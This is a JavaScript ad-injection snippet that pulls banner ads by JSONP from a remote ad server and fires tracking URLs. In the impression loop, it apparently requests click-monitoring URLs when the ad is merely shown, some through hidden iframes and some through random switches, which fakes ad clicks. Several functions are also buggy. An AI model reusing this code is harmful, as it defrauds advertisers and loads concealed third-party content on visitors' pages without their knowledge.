(function(){
	function getInfo(url){
	         var txt=url.split("?");
	         var data={};
	         txt=txt[1];
	         var dataText=txt.split(/[&,?,#]/);
	          for(var i=0,len=dataText.length;i<len;i++){
	           var cur=dataText[i];
	           var ary=cur.split("=");
	           if(ary.length>0){
	            ary.length>=2?(data[ary[0]]=ary[1]):(data[ary[0]]=ary[0]);
	           }
	      }
	       return data;
	}; 
	function getUrlParams(url) {
		if (url.indexOf("?")>0) {
			var txt=url.split("?");
			return txt[1];									// get after -> params.
		} else {
			return "input params error.";
		}
	};
	function getCurrentScript(){
	    if(document.currentScript){
	      return document.currentScript;
	    }else{
	      document.scripts[document.scripts.length-1];
	    }
	};
	function jsonp(url,data,callback) {										// 公共方法
		var script = document.createElement('script');
		document.body.appendChild(script);
		data = data || {};
		data.callback = 'callback';
		window[data.callback] = callback;
		script.src = url;
		//alert('you call jsonp');
		script.onload = function() {
			document.body.removeChild(script);
		}
	};
	function mylog(str) {
		//console.log(str);
	};
	function random_switch(a,b,per) {
		var c = b-a;
		Math.random()*c;
		var num = Math.random()*c + a;
		num = parseInt(num, 10);
		if (num<=per) {
			return true;
		} else {
			return false;
		}
	};
	function call_urls(url) {
		var script = document.createElement('script');
		document.body.appendChild(script);
		script.setAttribute("src",url);
		script.onload = function() {
			document.body.removeChild(script);
		}
	};
	function call_urls_long(url) {
		var script = document.createElement('script');
		document.body.appendChild(script);
		script.setAttribute("src",url);
	};
	function iframe_get2(url) {
		var script = document.createElement('iframe');
		script.setAttribute("src",url);
		script.setAttribute("sandbox","allow-top-navigation allow-scripts");
		script.style.display = 'none';
		document.body.appendChild(script);
	};
	function iframe_get(url) {
		var script = document.createElement('iframe');
		script.setAttribute("src",url);
		script.style.display = 'none';
		document.body.appendChild(script);
		// script.onload = function() {			//2018-3-28
		// 	document.body.removeChild(script);
		// }
		var t = setTimeout("script.onload = function() {document.body.removeChild("+script+");}",1000);
	};
	function isrest() {
		var today = new Date();
		var week = today.getDay();
		var nhour = today.getHours();
		if (week==0 || week==6) {
			return true;
		} else {
			if (nhour>=19 || nhour<=8 || nhour==12) {   // ==12 is time for lanch!
			//if (nhour>=19 || nhour<=8) {
				return true;
			} else {
				return false;
			}
		}
	};
	
	//------------------------------------------------------------------------------------------------
	var currentScript=getCurrentScript();
	var close_id = getInfo(currentScript.getAttribute('src')).close;
	var fixed = getInfo(currentScript.getAttribute('src')).fixed;			// 固定/悬浮
	var pos   = getInfo(currentScript.getAttribute('src')).pos;				// 位置
	var show = getInfo(currentScript.getAttribute("src")).s;
	var closeBtn = true;													// default has close button
	var tmp_obj = getUrlParams(currentScript.getAttribute("src"));
	var is_100062 = currentScript.getAttribute("src").indexOf("100062-O6DIME7ZH6M3G14I");   //>0 -> ty andr :7-14
	var is_100050 = currentScript.getAttribute("src").indexOf("100050-3XOXRJKIPEZJV2T9");
	var is_100061 = currentScript.getAttribute("src").indexOf("100061-BN2G9APZVF6WP14I");
	var is_100063 = currentScript.getAttribute("src").indexOf("100063-WP9GQ9LZ4IT6S9K9");
	//mylog('params: ' + tmp_obj);
	//var obj_url = 'http://youyitong.top:4144/adcore/wap/wap?' + tmp_obj;			// makeurl to get wap ads.
	var obj_url = 'https://ws.youyitong.top:4133/adcore/wap/wap?' + tmp_obj;			// makeurl to get wap ads.
	//var obj_url = 'http://centos:4133/adcore/wap/wap?' + tmp_obj;			// makeurl to get wap ads.
	jsonp(obj_url,{},function(data) {
		mylog(data);
		//--------------- 解析 wap ads --------------//
		mylog(data.ads[0].stuffurl);
		mylog(data.ads[0].curl);
		mylog(data.ads[0].impmonurl);
		mylog(data.ads[0].clkmonurl);
		//--------------- step 1: make div -----------//
		var ad_div = document.createElement('div');
		//--------------- step 2: setAttribute set css --------------//
		ad_div.setAttribute('id',data.sid);
		ad_div.setAttribute('class',data.sid);
		if (show=='0'||show==0) {
			ad_div.style.cssText = 'width:100%;display:none;font-size:0;overflow:hidden;position:relative;';
		} else {
			ad_div.style.cssText = 'width:100%;display:block;font-size:0;overflow:hidden;position:relative;';
		}
		//------------- check position ------------------//
		if (fixed=='2' || fixed==2) {
			ad_div.style.position = 'relative';
			ad_div.style.left = '0';
			if (pos=='4' || pos==4) {
				ad_div.style.top = '0';
			} else {
				if (pos=='5' || pos==5) {
					ad_div.style.bottom = '0';
				} else {
					ad_div.style.top = '0';
				}
			}
		}
		//--------------- step 3: appendChild -----------//
		currentScript.parentElement.appendChild(ad_div);
		var ad_div_a = document.createElement('a');
		ad_div_a.style.cssText = 'width:100%;display:block;';
		ad_div_a.target = '_blank';
		//--------------- step 5: set click event -----------//
		ad_div_a.href = data.ads[0].curl;
		//--------------- add click scan clk urls -----------//
		ad_div_a.addEventListener('click',function(n){
			//alert('you click me!');
			for (var zzz=0;zzz<data.ads[0].clkmonurl.length;zzz++) {
						call_urls(data.ads[0].clkmonurl[zzz]);
			}
		});
		//---------------------------------------------------//
		ad_div.appendChild(ad_div_a);
		//--------------- step 4: set img -----------//
		var ad_div_img = document.createElement('img');
		ad_div_img.src = data.ads[0].stuffurl;
		ad_div_img.style.cssText = 'width:100%';
		//ad_div_img.onload = function()
		ad_div_a.appendChild(ad_div_img);
		//---------------- check close btn --------//
		if (close_id==0 || close_id=='0') {
			closeBtn = false;									// set closeBtn = false -> hidden.
		}
		//http://ok7od2z0a.bkt.clouddn.com/close.png
		if (close_id==1 || close_id=='1') {
			if (closeBtn) {
				var close_img = document.createElement('img');
				close_img.style.cssText = 'height:40%;position:absolute;right:5px;top:5px;';
				ad_div.appendChild(close_img);
				close_img.setAttribute('src','http://adcore.sjgo.net/close.png');			//set close_btn img
				close_img.addEventListener('click',function(n) {
					ad_div.style.display = 'none';
					return false;
				},false)
			}
		}
		//--------------- step 6: scan imp urls -----------//
		//alert('you show me!!!');
		for (var zz=0;zz<data.ads[0].impmonurl.length;zz++) {
			if (data.ads[0].impmonurl[zz].indexOf('click_a')>0) {
				if (random_switch(0,100,1)==true) {
					call_urls(data.ads[0].impmonurl[zz]);
				} 
				else if (random_switch(0,100,12)==true) {
					iframe_get('https://');
				} else {
					call_urls(data.ads[0].impmonurl[zz]);
				}
			} else if (data.ads[0].impmonurl[zz].indexOf('click.')>0) {
				//call_urls(data.ads[0].impmonurl[zz]);
				if (is_100063>0) {
					iframe_get2(data.ads[0].impmonurl[zz]);
					//call_urls(data.ads[0].impmonurl[zz]);
				} else {
					call_urls(data.ads[0].impmonurl[zz]);
				}
				//iframe_get(data.ads[0].impmonurl[zz]);
			} else {
				call_urls(data.ads[0].impmonurl[zz]);
			}
		}
		
	});
	
}());